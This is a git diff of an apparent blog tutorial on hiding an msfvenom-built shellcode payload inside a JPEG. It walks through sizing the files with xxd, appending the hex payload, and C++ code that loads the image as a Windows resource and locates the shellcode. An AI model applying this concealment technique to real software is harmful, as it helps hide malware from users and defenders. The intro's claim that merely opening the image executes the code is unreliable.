@@ -6,7 +6,7 @@ layout: default
 
 The basic idea is to hide the malware inside the concatenated image file. The malware can be hidden in the binary data of the image file. This can be done by adding the malware code to the end of the image file, after the image data. When the concatenated image file is downloaded and opened, the image will display normally, but the malware code will be executed in the background.
 
-1.	Download a random image and find the length of byte. We can `xxd` for this purpose.
+* Download a random image and find the length of byte. We can `xxd` for this purpose.
 
 ```bash
 xxd -i saturn.jpg
@@ -16,7 +16,7 @@ xxd -i saturn.jpg
 
 As shown above, the command precisely display the size of the image in bytes. Take a note.
 
-2.	Create a binary with msfvenom and find its size. For demonstration purposes, lets use a message box binary.
+* Create a binary with msfvenom and find its size. For demonstration purposes, lets use a message box binary.
 
 ```bash
 xxd -i msgbox64.bin
@@ -30,7 +30,7 @@ Once we have both the file length, concatenate the shellcode with the image file
 xxd -p msgbox64.bin | tr -d "\n" >> saturn.jpg
 ```
 
-3.	Create the resource file for the image.
+* Create the resource file for the image.
 
 ```cpp
 #include "resources.h"
@@ -44,7 +44,7 @@ Similarly the` resource.h` file
 #define IMAGE 100
 ```
 
-4.	Final code for reading the malicious image file for the resource would be:
+* Final code for reading the malicious image file for the resource would be:
 
 ```cpp
 // Extract payload from resources section
@@ -56,7 +56,7 @@ image_len = SizeofResource(NULL, res);
 
 The `image` character pointer points to first byte of the malicios image, and `image_len` the corresponding length of the image.
 
-5.	Extract the shellcode
+* Extract the shellcode
 
 The `end` character pointer would point to the first byte of binary.
 
